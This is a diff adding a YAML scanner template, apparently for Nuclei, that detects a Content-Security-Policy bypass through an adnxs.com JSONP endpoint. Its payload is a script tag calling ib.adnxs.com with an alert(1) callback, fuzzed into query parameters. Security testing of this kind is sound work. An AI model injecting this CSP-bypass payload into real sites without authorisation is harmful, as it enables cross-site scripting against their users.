@@ -1,0 +1,55 @@
+id: adnxs-ib-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Adnxs IB
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,adnxs-ib
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "adnxs.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: adnxs_ib_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "adnxs_ib_csp_xss == true"
+# digest: 4a0a0047304502201b1ef9ff8d1ec0c35d229ab8804975f667a725717fe845da14fb986ed768ce88022100fd90a1e6722e2bfde8fae1cf74747276c3ae66438267f2f1bb3bd0422d2c9d74:922c64590222798bb761d5b6d8e72950
